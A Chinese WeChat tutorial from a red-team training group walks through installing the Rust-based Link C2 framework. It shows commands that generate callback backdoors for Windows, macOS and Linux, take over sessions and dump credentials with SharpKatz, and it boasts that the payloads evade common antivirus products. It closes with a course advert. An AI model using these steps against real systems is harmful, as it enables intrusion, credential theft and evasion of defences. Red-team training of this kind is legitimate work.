> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Gov_i1ijy6A49R6gbEAzow)

********文章来源｜MS08067 内网攻防知识星球********  

========================================

> 本文作者：**清风**（Ms08067 内网小组核心成员）

****学内网 认准 Ms08067**  
**

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa9Y7Ac6gb6JZVymJwS3gu8cRey7icGjpsvppvqqhcYo6RXAqJcUwZy3EfeNOkMRS37m0r44MWYIYmg/640?wx_fmt=png)

  
**⼀、⼯具简介**  

在翻看公众号的时候发现有⼤佬简单介绍了下这款⼯具，⽹上的教程⼏乎没有，简单研究了下。

Link ：rust 语⾔开发的 c2 框架，因为开发语⾔⼩众，所以⽬前国内所有杀软都可过包括 WindowsDefender。  

功能虽然没有 MSF 和 CobaltStrike 成熟，但还是很强⼤的，⾜够实现红队渗透测试⼯作，当 CS/MSF 特征⽆法绕过的时候，可以尝试使⽤这个⼯具

**项⽬地址：**  

https://github.com/postrequest/link

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaicxibIXh72mBHgzFvQTRJw1OlLzy4rYInKIsnPEAdZOvyickW6oSkRC1DbaS7MUORNBRmYSh2IjZLgQ/640?wx_fmt=png)

**⼆、安装**  
不知道是什么原因，国外的 vps 安装后都⽆法⽣成载荷，暂时未能解决，最后⽤国内 vps 实验成功的  
安装过程较为简单 ：

```
$ git clone https://github.com/postrequest/link
$ cd link/
$ ./kali-install.sh
```

执⾏后  
会出现这个⻚⾯后，三个选项分别是：  
1、继续安装（默认安装）  
2、⾃定义安装  
3、取消安装

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaicxibIXh72mBHgzFvQTRJw1OrUYpbhDPwVibGrD5T1YWRIDickShVMRaa45UW1icjen9mtymzpgJUx2gQ/640?wx_fmt=png)

  
这⾥选择 1 默认安装即可  
安装过程较为漫⻓，需要等待下⾯进度条结束：  

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaicxibIXh72mBHgzFvQTRJw1OyLq0Ftj03Mbsm9xCovc6iczVg4R9mteTjcG2M43k2NFzibibfLHpeydKQ/640?wx_fmt=png)

  
结束后后直接重启，因为 rust 安装完后需要重启⽣效 ：

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaicxibIXh72mBHgzFvQTRJw1OYDxdb5lLka9jj57KTZRykk6a3g0yp7blUGgHdDTo1ynmibbib5zXAk4A/640?wx_fmt=png)

重启后，再次进⼊到 / link ⽂件夹下，运⾏启动命令：

```
./target/release/link //不建议进⼊/target/release/⽬录再执⾏link，那样会让你指定
证书位置
```

启动后，会让你设置⼀个监听端⼝，这个端⼝也是后续 shellcode 中的端⼝ ：  

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaicxibIXh72mBHgzFvQTRJw1Oos6BAYscURnicvgWXlqbzTXib5yMbZicYLPkaeX7sJfPvIhKIzj9jTCOQ/640?wx_fmt=png)

  
然后进⼊到 link 的管理模式下，

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaicxibIXh72mBHgzFvQTRJw1OibiaYSYrVJcnw6rU6HJUgqHtBGLeiaFN7icEibOSCeMV8ibtkNw4HZPWgNmQ/640?wx_fmt=png)

  
主要⽤到前三条：  
在 Windows， MacOS ， Linux 中⽣成载荷：  

```
generate vps-ip:port #⽣成 windows 后⻔
generate-osx vps-ip:port #⽣成 苹果 载荷
generate-linux vps-ip:port #⽣成 linux 载荷
```

**Windows 上线：**  
⽣成 Windows 后⻔（过程相当漫⻓，请耐⼼等待）：  

```
generate vps-ip:9080
```

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaicxibIXh72mBHgzFvQTRJw1ODibiaMu2UNzgR5Ud1rDqu1vrUrpcx1RWpWB0JtsaQibuTj3R3a8T9biceQ/640?wx_fmt=png)

  
运⾏ link.exe 后上线：  
查看当前会话：links ，类似 MSF 的 Sessions

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaicxibIXh72mBHgzFvQTRJw1OgBIOMqzkJUsjQILibWWNr5IiaL6p2HLzK8enjggNpSFeibWQY3fDKzR0Q/640?wx_fmt=png)

  
进⼊到当前会话 links -i 会话 ID ：  
进⼊到当前会话中后 可以执⾏命令 whoami

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaicxibIXh72mBHgzFvQTRJw1OFgdxiba8rtp2E3oxMZukKOUKxs5GJ5fNHLkpU7RR7CNvoiaib0yU90L1g/640?wx_fmt=png)

  
抓取密码：  
这个模块需要安装 SharpCollection ⼯具，不然会报错，提示你安装

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaicxibIXh72mBHgzFvQTRJw1O0WHNqyM0FTtMpLqCSp4K8U66kbI2ULJiaSwjpiaNf5uKlAF9TE0zAmeg/640?wx_fmt=png)

  
安装完后再次执⾏：

```
sharp //可罗列出所有的tools
```

功能很多，这⾥只介绍 SharpKatz 模块

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaicxibIXh72mBHgzFvQTRJw1Owl7ULsU9PRUNmVWefmcGIzbyZu4JLG5SIpNNzPNSJj9qPG7rgk5cqA/640?wx_fmt=png)

  
SharpKatz 参数介绍：  

https://github.com/b4rtik/SharpKatz

```
sharp svchost SharpKatz --Command logonpasswords //抓取密码
```

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaicxibIXh72mBHgzFvQTRJw1OWt8hicgcywqevb6OCwoNAJ4bPgpB5es53j1hXh2t72OW5WrA49kkHbQ/640?wx_fmt=png)

还有很多功能，后续待补充。  

**Linux 上线：**  
⽣成后⻔：

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaicxibIXh72mBHgzFvQTRJw1O3MXhWfdRlS9FSQpqLaGk0eT8kquJYH6qt0ic8L1j68lCWeXYzxTfxVg/640?wx_fmt=png)

  
然后上传到⽬标运⾏ ，成功上线，然后就是 Linux 上线后的操作：

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaicxibIXh72mBHgzFvQTRJw1OGoFVcTiamqlV7OzLia8x8cbV2R3m0g6W0UBEWnv255rl3sFRhQWUe8Sw/640?wx_fmt=png)

  
执⾏命令：  

```
shell linux命令
```

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaicxibIXh72mBHgzFvQTRJw1OFeMoK8IcRhC0tSy3JsqljFmocRYYEHLJqxV5dueuSkfh8HE1MquBGA/640?wx_fmt=png)

  
未完待续。。。

**ByPass ⽅⾯：**  
通过测试发现：Windows Defender、⽕绒、 360 动态、静态都可过  

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaicxibIXh72mBHgzFvQTRJw1OJw7sS0kIzEdgPdKwgRDrUG6dyzWMY9fSjQQ18ibpnog79BB0auAiaRYQ/640?wx_fmt=png)

**1.7** **号** ****红队攻防 第 5 期  最后来袭****

**课程费用**

每期班定价 **2999**，**第五期班****早鸟****价****：****2499**（前 40 名送 499 元内网知识星球名额），**每个报名学员都可享受一次免费重听后续任意一期班的权益**，一次没学懂就再来一遍！  

培训采用在线直播 + 随堂录播 + 作业 + 微信群讲师解答的形式，无需等待，报名后立即进入 “内网星球” 开始预习。毕业推荐 HW，推荐就业，有永久录播，报一期班可免费再参加后续任意一期班，内部 VIP 学习群永久有效。（可开发票，支付信用卡、花呗分期）

**报名咨询联系小客服**  

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaic7PmuiclIvD4GdJTRLwCZx3icnFdNc5iatEKWoEwtDiaQaiahUm6fj8nboPicd9vddIo3SYQrqQibtMUwbw/640?wx_fmt=jpeg)  

扫描下方二维码加入星球学习

加入后会邀请你进入内部微信群，内部微信群永久有效！

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa9Y7Ac6gb6JZVymJwS3gu8cniaUZzJeYAibE3v2VnNlhyC6fSTgtW94Pz51p0TSUl3AtZw0L1bDaAKw/640?wx_fmt=png) ![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa9Y7Ac6gb6JZVymJwS3gu8cT2rJYbRzsO9Q3J9rSltBVzts0O7USfFR8iaFOBwKdibX3hZiadoLRJIibA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaicBVC2S4ujJibsVHZ8Us607qBMpNj25fCmz9hP5T1yA6cjibXXCOibibSwQmeIebKa74v6MXUgNNuia7Uw/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa9Y7Ac6gb6JZVymJwS3gu8cRey7icGjpsvppvqqhcYo6RXAqJcUwZy3EfeNOkMRS37m0r44MWYIYmg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicjovru6mibAFRpVqK7ApHAwiaEGVqXtvB1YQahibp6eTIiaiap2SZPer1QXsKbNUNbnRbiaR4djJibmXAfQ/640?wx_fmt=jpeg) ![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaicJ39cBtzvcja8GibNMw6y6Amq7es7u8A8UcVds7Mpib8Tzu753K7IZ1WdZ66fDianO2evbG0lEAlJkg/640?wx_fmt=png)  

目前 50000 + 人已关注加入我们  
![](https://mmbiz.qpic.cn/mmbiz_gif/XWPpvP3nWa9FwrfJTzPRIyROZ2xwWyk6xuUY59uvYPCLokCc6iarKrkOWlEibeRI9DpFmlyNqA2OEuQhyaeYXzrw/640?wx_fmt=gif)